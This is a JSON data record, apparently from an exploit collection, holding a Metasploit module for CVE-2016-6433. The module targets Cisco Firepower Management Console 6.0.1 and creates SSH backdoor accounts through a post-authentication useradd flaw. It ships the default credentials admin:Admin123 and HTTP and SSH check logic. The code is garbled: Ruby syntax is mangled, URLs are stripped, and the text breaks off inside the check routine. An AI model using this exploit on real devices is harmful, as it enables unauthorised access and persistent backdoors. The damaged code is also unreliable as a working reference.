{
    "text": "vul_name : Cisco Firepower Management Console 6.0 Post Authentication UserAdd ， vul_cve : CVE-2016-6433 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， include Msf : Exploit : Remote : SSH ， super ( update_info ( info ,  ， 'Name' => \"Cisco Firepower Management Console 6.0 Post Authentication UserAdd Vulnerability\" ,  ， 'Description' => %q{ ， This module exploits a vulnerability found in Cisco Firepower Management Console. ， The management system contains a configuration flaw that allows the www user to ， execute the useradd binary , which can be abused to create backdoor accounts. ， Authentication is required to exploit this vulnerability. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Matt' ,  # Original discovery & PoC ， 'sinn3r' # Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2016-6433' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Platform' => 'linux' ,  ， 'Arch' => ARCH_X86 ,  ， 'Targets' => ，  [  ，  [ 'Cisco Firepower Management Console 6.0.1 ( build 1213 ) ' , {} ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => 'Oct 10 2016' ,  ， 'CmdStagerFlavor'=> %w{ echo } ,  ， 'DefaultOptions' => ， { ， 'SSL' => 'true' ,  ， 'SSLVersion' => 'Auto' ,  ， 'RPORT' => 443 ， } ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ，  # admin : Admin123 is the default credential for 6.0.1 ， OptString.new ( 'USERNAME' ,  [ true , 'Username for Cisco Firepower Management console' , 'admin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password for Cisco Firepower Management console' , 'Admin123' ]  )  ,  ， OptString.new ( 'NEWSSHUSER' ,  [ false , 'New backdoor username ( Default : Random ) ' ]  )  ,  ， OptString.new ( 'NEWSSHPASS' ,  [ false , 'New backdoor password ( Default : Random ) ' ]  )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path to Cisco Firepower Management console' , '/' ]  )  ,  ， OptInt.new ( 'SSHPORT' ,  [ true , 'Cisco Firepower Management console\\'s SSH port' , 22 ]  )  ，  ]  , self.class )  ， end ， def check ，  # For this exploit to work , we need to check two services :  ，  #  * HTTP - To create the backdoor account for SSH ，  #  * SSH - To execute our payload ， vprint_status ( 'Checking Cisco Firepower Management console.' )  ， res = send_request_cgi ( { ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path , '/img/favicon.png?v=6.0.1-1213' )  ， } )  ， vprint_status ( \"Console is found.\" )  ， vprint_status ( \"Checking SSH service.\" )  ， begin ，  : Timeout.timeout ( datastore [ 'SSH_TIMEOUT' ]  ) do ， Net : SSH.start ( rhost , 'admin' ,  ， port : datastore [ 'SSHPORT' ]  ,  ， password : Rex : Text.rand_text_alpha ( 5 )  ,  ， auth_methods :  [ 'password' ]  ,  ， non_interactive : true ， end ， rescue Timeout : Error ， vprint_error ( 'The SSH connection timed out.' ) ",
    "time": "2017.01.12"
}